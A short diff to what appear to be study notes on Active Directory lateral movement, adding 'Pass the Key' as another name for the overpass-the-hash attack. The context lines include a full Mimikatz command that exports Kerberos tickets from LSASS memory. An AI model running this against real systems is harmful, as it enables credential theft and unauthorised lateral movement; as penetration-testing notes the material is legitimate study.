@@ -46,7 +46,7 @@ Another method for moving laterally in an Active Directory environment is called
 ## On Windows, tickets are processed and stored by the LSASS
 
 ticket #=> pass the ticke attack
-ekeys #=> over pass the hash attack
+ekeys #=> over pass the hash attack or Pass the Key attack
 
 ## Mimikatz - Export Tickets
 mimikatz.exe "privilege::debug" "sekurlsa::tickets /export" exit 
